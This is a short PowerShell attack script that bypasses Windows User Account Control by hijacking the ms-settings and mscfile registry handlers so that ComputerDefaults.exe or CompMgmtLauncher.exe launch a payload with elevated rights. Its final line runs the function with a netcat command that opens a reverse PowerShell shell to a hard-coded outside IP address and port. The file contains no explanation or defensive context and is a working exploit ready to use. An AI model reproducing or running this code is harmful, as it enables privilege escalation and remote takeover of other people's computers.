function Insomnia{
	[CmdletBinding()]
	param([string]$payload='powershell.exe')

    #Get Windows Version
    $ver = [System.Environment]::OSVersion.Version.Major

	#Get UAC Level
	$key = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
	$uac = Get-ItemPropertyValue -Path $key -Name ConsentPromptBehaviorAdmin

	function Add-RegKey([string]$key, [string]$exploit, [string]$payload='powershell.exe'){
		$regPath = "HKCU:\Software\Classes\$key\shell\open\command"
		New-Item $regPath -Force
		New-ItemProperty $regPath -Name "DelegateExecute" -Value $null -Force
		Set-ItemProperty $regPath -Name "(default)" -Value $payload -Force
		Start-Process $exploit
		Start-Sleep -s 5
		Remove-Item $regPath -Force -Recurse
	}

	if ($uac -eq 2) {
		$UAC_LEVEL = 'High'
	} elseif ($uac -eq 0) {
		$UAC_LEVEL = 'None'
	} elseif ($uac -eq 5) {
		$UAC_LEVEL = 'Default'
	} else {
		$UAC_LEVEL = 'Unknown'
	}

	if ($UAC_LEVEL -eq "High") {
		exit
	} elseif ($UAC_LEVEL -eq "None") {
		Start-Process -FilePath $payload -verb runas
	} else {
		if ($ver -eq 10) {
			Add-RegKey ms-settings ComputerDefaults.exe $payload
		} else {
			Add-RegKey mscfile CompMgmtLauncher.exe $payload
		}
	}
}
Insomnia "C:\Users\$env:username\nc.exe 93.93.112.211 87 -e powershell.exe"